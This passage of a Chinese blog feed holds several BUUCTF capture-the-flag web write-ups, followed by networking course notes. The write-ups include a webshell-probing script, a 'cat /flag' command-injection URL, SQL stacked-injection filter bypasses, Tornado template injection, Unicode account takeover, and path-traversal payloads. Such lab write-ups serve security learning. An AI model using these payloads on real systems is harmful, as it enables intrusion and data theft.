class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = params[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = data[i][:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> params:</span><br><span class="line">        params[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://localhost/src/'</span> + file, data=data, params=params)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">'glzjin'</span>) != <span class="number">-1</span>:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print("====================")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:  <span class="comment"># 遍历文件夹</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(file):  <span class="comment"># 判断是否是文件夹，不是文件夹才打开</span></span><br><span class="line">            <span class="comment"># read_file(file)</span></span><br><span class="line"></span><br><span class="line">            pool.submit(read_file, file)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_param</span><span class="params">(fileName)</span>:</span></span><br><span class="line">    url = <span class="string">"http://localhost/src/"</span></span><br><span class="line">    f = open(path+<span class="string">'/'</span>+fileName, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    content = f.read()</span><br><span class="line">    m = re.findall(<span class="string">"\$_(GET|POST)\['(.+?)'\]"</span>, content)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">for</span> seq <span class="keyword">in</span> m:</span><br><span class="line">            print(<span class="string">'finding...'</span>)</span><br><span class="line">            method = seq[<span class="number">0</span>]</span><br><span class="line">            param = seq[<span class="number">1</span>]</span><br><span class="line">            payload = <span class="string">''</span></span><br><span class="line">            payload += <span class="string">'?'</span></span><br><span class="line">            payload += param</span><br><span class="line">            payload += <span class="string">"="</span></span><br><span class="line">            payload += <span class="string">"echo glzjin"</span></span><br><span class="line">            res = requests.get(url + fileName + payload)</span><br><span class="line">            n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> n:</span><br><span class="line">                print(<span class="string">'found!'</span>)</span><br><span class="line">                print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">elif</span> method == <span class="string">'POST'</span>:</span><br><span class="line">                postData = &#123; param: <span class="string">"echo glzjin'"</span> &#125;</span><br><span class="line">                res = requests.post(url + fileName, data=postData)</span><br><span class="line">                n = re.findall(<span class="string">'glzjin'</span>, res.text)</span><br><span class="line">                <span class="keyword">if</span> n:</span><br><span class="line">                    print(fileName, method, param, <span class="string">"found!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#find_file()</span></span><br><span class="line">    find_param(<span class="string">'xk0SzyKwfzw.php'</span>)</span><br></pre></td></tr></table></figure>

<p>在运行脚本之前需要启动PHP环境 并根据自己的路径进行相应的修改<br><img src="/images/BUUCTF/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/0.png" alt="avatar"></p>
<p>成功找到</p>
<p>去这个文件去看看<br><img src="/images/BUUCTF/%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/1.png" alt="avatar"><br>这个部分很关键</p>
<p>接下来就构造payload:<br><a href="http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag" target="_blank" rel="noopener">http://c9d08f8b-8738-4265-a7ec-e5f223c985cf.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</a></p>
<p>得到flag</p>
<p>感觉不是太懂官方这个WP 为什么说那一段代码很关键 我表示一脸懵逼看不出来<br>后面又找了一篇WP，看了一下，大概就是该后门的密码之类的<br>可以参考一下：<br><a href="https://www.cnblogs.com/chrysanthemum/p/11717337.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11717337.html</a></p>
<p>另外官方的脚本感觉就像已经知道了是哪个文件 特定也出来的 速度非常快 可能这就是出题人自己写WP的弊病吧 建议采用一下上面这篇文章里的脚本 虽然很慢 但是有那种爆破的感觉了 而不是直接输出是哪个文件</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-admin</title>
    <url>/2020/01/18/BUUCTF-admin/</url>
    <content><![CDATA[<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>打开环境，再根据题目，可以猜测大概是伪造admin登录就OK了<br>没有什么思路 先随便注册一个吧<br>登录之后，点change password  查看一下源码<br>得到hint<br><img src="/images/BUUCTF/admin/0.png" alt="avatar"></p>
<p>又又又又是flask  我要吐了</p>
<p>复制连接 下载一下</p>
<p>随后打开index.php 查看代码</p>
<p>flask之前比赛时遇到过，CNSS也遇到过，一个轻量级的python框架，这题有两种解法，一种是session  写脚本就可以直接得到 但是奈何不会写</p>
<p>所以只好使用strlower  转小写函数去尝试注册ADMIN<br>哦豁，发现GG了，那再看看strlower的定义中有nodeprep.prepare()这个函数<br>我们先使用unicode编码的字符 ᴬ<br>用这个用户名注册</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">ᴬ<span class="built_in">dmin</span></span><br></pre></td></tr></table></figure>
<p>这个时候nodeprep.prepare()函数会将用户名变为Admin，随便修改一下密码，就会再次调用该函数变为admin</p>
<p>这个时候其实已经覆写了admin的密码 直接登录</p>
<p>得到flag</p>
<p>这里是利用了unicode的编码问题<br>可以参考一下：<br><a href="https://unicode-table.com/en/blocks/phonetic-extensions/" target="_blank" rel="noopener">https://unicode-table.com/en/blocks/phonetic-extensions/</a></p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-EasySQL 1</title>
    <url>/2020/01/18/BUUCTF-EasySQL-1/</url>
    <content><![CDATA[<h1 id="EasySQL-1"><a href="#EasySQL-1" class="headerlink" title="EasySQL 1"></a>EasySQL 1</h1><p>题目得到是SQL注入，那就直接上手，先按常规的来：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 返回数据</span><br><span class="line"><span class="number">1</span><span class="string">' 没有返回数据  看来不需要'</span></span><br><span class="line"><span class="number">1</span>;  正常返回</span><br><span class="line"><span class="number">1</span>; show databases;  和前面学到的堆叠一样的原理</span><br><span class="line"><span class="number">1</span>; show tables;  Array ( [<span class="number">0</span>] =&gt; Flag )</span><br></pre></td></tr></table></figure>
<p>接下来就没有头绪了，看了一下WP，感觉大佬说的听不太懂</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">select</span> $<span class="variable">_GET</span>[<span class="string">'query'</span>] || <span class="built_in">flag</span> <span class="keyword">from</span> <span class="built_in">flag</span></span><br></pre></td></tr></table></figure>
<p>这是内嵌的select</p>
<p>输入的参数都传给了query，所以只要query为1，即为真，就返回flag</p>
<p>但是我真的很想知道这个内嵌是怎么看出来的，唉，还是太菜了</p>
<p>最后输入</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">*,<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>最后这个输入进去，按照刚才的拼接，后台的代码呈现的应该是：</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">select</span> *,<span class="number">1</span> || <span class="built_in">flag</span> <span class="keyword">from</span> <span class="built_in">flag</span></span><br></pre></td></tr></table></figure>
<p>大佬们还是太强了</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-easy_tornado 1</title>
    <url>/2020/01/18/BUUCTF-easy-tornado-1/</url>
    <content><![CDATA[<h1 id="easy-tornado-1"><a href="#easy-tornado-1" class="headerlink" title="easy_tornado 1"></a>easy_tornado 1</h1><p>打开环境就看到三个链接，依次打开得到：<br>flag in /fllllllllllllag</p>
<p>render</p>
<p>md5(cookie_secret+md5(filename))</p>
<p>目前看来只有第一个和第三个有用<br>flag在/fllllllllllllag目录下<br>用到了md5</p>
<p>我觉得cookie_secret有点东西，百度了一下果然发现了题目<br><a href="https://www.cnblogs.com/liyqiang/p/7140530.html" target="_blank" rel="noopener">https://www.cnblogs.com/liyqiang/p/7140530.html</a></p>
<p>emmmm 貌似tornado是python的一个框架，python还木有学，太尴尬了<br>只好查资料，最后得到：<br>render好像是个渲染函数之类的</p>
<p>先随便看看：<br>尝试一下文件包含</p>
<p><img src="/images/BUUCTF/tornado/0.png" alt="avatar"></p>
<p>返回了错误界面，没有思路了，只好看看大佬的WP，存在模板注入；<br>Tornado可以参考这里：<br><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p>
<p>error改成：</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line">?msg=&#123;&#123;<span class="keyword">handler</span>.settings&#125;&#125;  <span class="keyword">handler</span>.settings获取环境变量</span><br></pre></td></tr></table></figure>

<p><img src="/images/BUUCTF/tornado/1.png" alt="avatar"></p>
<p>成功得到了cookie_secret<br>接下来就只需解决md5的问题了</p>
<p>然后，尴尬的问题又来了，不会写脚本 哭了，还是python的<br>所以说，开发和安全缺一不可，只好去找大佬的脚本<br><img src="/images/BUUCTF/tornado/2.png" alt="avatar"></p>
<p>构造payload:</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">file</span>?<span class="meta">filename</span>=/fllllllllllllag<span class="variable">&amp;&amp;filehash</span>=97a05accf0b1378842a54ec11b3074cb</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>学到了学到了 看完脚本之后，我觉得还是很简单的，就是没学python不懂语法，待我去肝一肝python</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-随便注 1</title>
    <url>/2020/01/18/BUUCTF-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
    <content><![CDATA[<h1 id="随便注-1"><a href="#随便注-1" class="headerlink" title="随便注 1"></a>随便注 1</h1><p>之前在强网杯的时候遇到这道题，当时卡了挺久的，就差最后一步 真的太可惜了</p>
<p>先随便点击一下提交<br><img src="/images/BUUCTF/%E9%9A%8F%E4%BE%BF%E6%B3%A81/0.png" alt="avatar"></p>
<p>看得出是一个sql注入类型的题目</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span> 没有报错</span><br><span class="line"><span class="number">1</span><span class="string">' 出现报错，验证存在注入</span></span><br><span class="line"><span class="string">1’# 没有报错</span></span><br><span class="line"><span class="string">1'</span> order by <span class="number">1</span><span class="comment"># 没有报错</span></span><br><span class="line"><span class="number">1</span><span class="string">' order by 3# 出现报错，证明字段有2个</span></span><br><span class="line"><span class="string">1'</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2<span class="comment">#   return preg_match("/select|update|delete|drop|insert|where|\./i",$inject); 过滤掉了很多关键字</span></span></span><br></pre></td></tr></table></figure>
<p>当时就卡在这里，现在想想还是很亏没有考虑的很多，赛后看了大佬们的WP才知道思路：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment"># 成功，说明存在堆叠注入</span></span><br></pre></td></tr></table></figure>
<p>堆叠注入可以参考一下：<br><a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p>
<p>我的理解下来，加上学完了数据库原理，大概意思就是;在数据库中代表一条语句的结束，系统识别到;时，前面的代码在系统中就被视为已经结束，所以可以利用;来进行堆叠注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment"># 得到表名1919810931114514</span></span><br></pre></td></tr></table></figure>
<p>这里用到了Mysql的预处理语句，可以参考这里：<a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">https://www.cnblogs.com/geaozhang/p/9891338.html</a></p>
<p>感觉有点像数据库安全那里，创建角色，然后把权限赋值给该角色，再通过该角色依次赋予权限，主要是为了省事。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PREPARE</span> sqla <span class="keyword">FROM</span> <span class="string">'[my sql sequece]'</span>; 预定义<span class="keyword">SQL</span>语句</span><br><span class="line"><span class="keyword">EXECUTE</span> sqla; 执行预定义<span class="keyword">sql</span>语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla; 删除预定义<span class="keyword">SQL</span>语句</span><br></pre></td></tr></table></figure>
<p>也可以通过变量传输</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> @tn=<span class="string">'hahaha'</span>; 存储表名</span><br><span class="line"><span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'select * from '</span>,@tn); 存储sql语句</span><br><span class="line"><span class="keyword">PREPARE</span> sqla <span class="keyword">FROM</span> @<span class="keyword">sql</span>; 预定义SQL语句</span><br><span class="line"><span class="keyword">EXECUTE</span> sqla; 执行SQL预定义语句</span><br><span class="line">(<span class="keyword">DEALLOCATE</span> || <span class="keyword">DROP</span>) <span class="keyword">PREPARE</span> sqla; 删除预定义SQL语句</span><br></pre></td></tr></table></figure>

<p>构造payload<br>这里可以用char()方法将ASCII码转换为select字符串，再利用concat()拼接</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">11';<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>),<span class="string">" * from `1919810931114514`"</span>);<span class="keyword">PREPARE</span> sqla <span class="keyword">from</span> @<span class="keyword">sql</span>;EXECUTEsqla;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-WarmUP</title>
    <url>/2020/01/18/BUUCTF-WarmUP/</url>
    <content><![CDATA[<h1 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h1><p>首先启动环境，发现滑稽图；没有什么好说的crtl+u查看源码：<br><img src="/images/BUUCTF/WarmUp/0.png" alt="avatar"></p>
<p>得到提示：source.php</p>
<p>通过URL访问一下 得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得知是PHP代码审计题</p>
<p>通过代码审计可以得到还有一个hint.php  访问得到：<br>flag not here, and flag in ffffllllaaaagggg</p>
<p>所以考虑最后的payload需要用到ffffllllaaaagggg</p>
<p>并且得到参数名称为file</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
<p> 关键代码，得知file变量不能为空，必须是字符串，还必须通过checkFile的检查<br> 经过查询函数：mb_strpos和mb_substr 的意思是截取变量page中？前面的字符串进行白名单校验<br> 所以source.php和hint.php均在白名单内，随意取一个构造payload:</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">file</span>=hint.php?<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>发现无法通过，是因为进行了三次检查，所以考虑URL编码问题，把?进行URL编码(注意使用英文?)<br>进行三次编码后?变为：%253F<br>构造payload：</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span>=hint.php%<span class="number">253</span>F<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第三章-数据链路层</title>
    <url>/2019/12/02/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<h1 id="第三章-数据链路层"><a href="#第三章-数据链路层" class="headerlink" title="第三章-数据链路层"></a>第三章-数据链路层</h1><h2 id="主要知识"><a href="#主要知识" class="headerlink" title="主要知识"></a>主要知识</h2><pre><code>数据链路层使用的两种主要信道是：
1.点对点信道
2.广播信道

数据链路层的三个基本问题：封装成帧，透明传输和差错检测
    封装成帧：在一段数据前后分别添加首部和尾部，构成一个帧，目的是让计算机知道何为开始，何为结束
    透明传输：表示无论什么样的比特组合的数据，都能够按照原样没有差错地通过这个数据链路层
    差错检测：只能检测出比特差错，广泛使用循环冗余检验CRC

数据链路层传输数据的基本单位是：帧

链路：就是从一个结点到相邻结点的一段物理线路（有线或无线），而中间没有任何其他的交换结点

*CRC：
    第一种情况，是发送端向接收方发送数据
    例：P（x）=x^3+1=&gt;1001（4位）
    想要发送的数据：1011 1100
    实际发送的数据：1011 1100 0000 （4-1）位
    FCS：（4-1）位</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/CRC.png" alt="avatar"></p>
<pre><code>余数作为FCS

    第二种情况，是接收方接收到的数据
    例：P（x）=x^3+1=&gt;1001(4位)
    接收到的数据1011 1100 0000
    这里由于是接收方发来的数据，所以不用再添加零

    现在使用1001除于1011 1100 0000查看余数是否为0，若不为零，则发送数据出现了差错；反之

 CRC只能检测出比特差错而不能纠正这种差错，所以数据链路层向网络层的是“不可靠传输”的服务

除了比特差错还有：帧丢失，帧重复，帧失序；这一类差错属于传输差错

点对点协议PPP：
    特点：1.简单 2.封装成帧 3.透明性 4.多种网络层协议 5.多种类型链路 6.差错检测 7.检测连接状态 8.最大传输单元 9.网络层地址协商 10.数据压缩协商

   组成：
   1.一个将IP数据报封装到串行链路的方法
   2.一个用来建立，配置和测试连接的链路控制协议LCP
   3.一套网络控制协议NCP

   帧的格式：</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%B8%A7%E7%9A%84%E6%A0%BC%E5%BC%8F.png" alt="avatar"></p>
<pre><code> 字节填充：当使用异步传输时，转义符定义为0x7D
方法：每出现一个0x7E就变为0x7D,0x5E
      每出现一个0x7D就变为0x7D,0x5D

零比特填充：发送端：发送连续的5个1，就在后面添加一个0
          接收端：接受连续的5个1，就把后面的一个0删除

局域网的主要优点：
1.具有广播功能
2.灵活多变
3.提高了系统的可靠性，可用性和生存性

局域网按拓扑结构可以分为：星型，环型和总线型

共享媒体资源的方法：
    1.静态划分信道（频分复用，时分复用等复用技术）
    2.动态媒体接入控制：随机接入，受控接入

以太网：以太网就是局域网，局域网&gt;以太网
    标准：DIX Ethernet V2 和 IEEE 802.3

网络适配器：俗称就是网卡
    功能：
    1.进行数据串行传输和并行传输转换
    2.对数据进行缓存
    3.在计算机的操作系统中安装驱动程序
    4.实现以太网协议

 以太网使用的是：CSMA/CD协议
     为了通信的简便，采用灵活的无连接工作方式，不进行编号，也不要求对方发回请求；所以是不可靠传输

  CSMA/CD的要点：
      多点接入：许多计算机以多点接入连接到一根总线上
      载波监听：每个站不停地检测信道
      碰撞检测：边发送边监听

  CSMA/CS采用的是半双工通信

  MAC层的硬件地址：
   MAC地址就是硬件地址
   在网络适配器上
   有48位（唯一性）
   工作在数据链路层

 以太网交换机：实际上就是多个接口的网桥
     每个通信的主机都是独占传输媒体，无碰撞地传输数据
     对收到的帧采用存储转发的方式

   交换表采用的是自学习算法：</code></pre><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%87%AA%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95.png" alt="avatar"></p>
<pre><code>100BASE-T:在双绞线上传输100Mbit/s基带信号
T：双绞线
BASE：基带信号
100：100Mbit/s</code></pre><h2 id="部分习题"><a href="#部分习题" class="headerlink" title="部分习题"></a>部分习题</h2><pre><code>*网络适配器的作用？工作在哪一层？
    1.进行数据串行传输和并行传输转换 
    2.对数据进行缓存
    3.在计算机的操作系统中安装驱动程序
    4.实现以太网协议；工作在数据链路层
    工作在数据链路层
*数据链路层的三个基本问题为什么都必须加以解决？
    ⑴封装成帧就是在一段数据前后分别添加首部和尾部。接收端以便从收到的比特流中识别帧的开始与结束，帧定界是分组交换的必然要求；
    ⑵ 透明传输避免消息符号与帧定界符号相混淆；
    ⑶差错检测防止差错的无效数据帧，浪费网络资源。</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82.png" alt="avatar">    </p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>日常学习</tag>
      </tags>
  </entry>
  <entry>
    <title>第二章-物理层</title>
    <url>/2019/12/01/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%89%A9%E7%90%86%E5%B1%82/</url>
    <content><![CDATA[<h1 id="第二章-物理层"><a href="#第二章-物理层" class="headerlink" title="第二章-物理层"></a>第二章-物理层</h1><h2 id="一、主要知识"><a href="#一、主要知识" class="headerlink" title="一、主要知识"></a>一、主要知识</h2><pre><code>常用术语：
数据：运送给消息的实体
信号：数据的电气和电子表示
模拟数据：数据是连续的
模拟信号：代表参数的取值是连续的
数字数据：数据是离散的
数字信号：代表参数的取值是离散的
基带信号：信源发出的信号
带通信号：经过调制之后的信号
码元：在使用时间域的波形
单工通信：只有一方可以发送数据，另一方接受数据
半双工通信：同一时间内，只有一方可以发送数据
全双工通信：同一时间内，双方都可以发送和接收数据

物理层的功能：尽可能地屏蔽掉传顺媒体，通信手段的差异，让数据链路层更好地传输比特流

传输媒体的接口特性：
1.机械特性：形状，尺寸，引脚数目和引脚排列顺序等
2.电气特性：电压的范围
3.功能特性：某一电平的电压意义
4.过程特性：事件发生的顺序

数据通信系统可以分为：源系统，传输系统，目的系统</code></pre><p>   <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%A8%A1%E5%9E%8B.png" alt="avatar"><br>       注：调制解调器的作用是为了在模拟信道上传输数字数据</p>
<pre><code>常见的编码方式：
1.不归零制
2.归零制
3.曼切斯特编码
4.差分曼切斯特编码

基本的带通调制方法：
调幅：即载波的振幅随基带数字信号而变化
调频：即载波的频率随基带数字信号而变化
调相：即载波的初始相位随基带数字信号而变化

传输媒体可以分为两大类：
一、导引型传输媒体
    1.双绞线 2.同轴电缆 3.光纤
二、非导引型传输媒体
    微波，卫星等

 *信道复用技术：
 频分复用FDM
 时分复用TDM
 统计时分复用STDM
 波分复用WDM
 码分复用CDM

 ADSL技术：非对称数字用户线ADSL

 奈氏准则：在任何信道，传输速率都有上限值，超出则出现码间串扰

 香农公式：只要不超出上限值，一定有方法实现无差错传输

 信噪比：信号平均功率和噪音平均功率之比

 频带宽度，信噪比，码元传输速率确定了如何提高传输速率？</code></pre><h2 id="二、部分习题"><a href="#二、部分习题" class="headerlink" title="二、部分习题"></a>二、部分习题</h2><pre><code>假定某信道受奈氏准则限制的最高码元速率为20000码元/秒。如果采用振幅调制，把码元的振幅分为16个不同等级来传送，那么可以获得多高的数据率？
    公式：</code></pre><p>  <img src="/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%A5%88%E6%B0%8F%E5%87%86%E5%88%99.png" alt="avatar"></p>
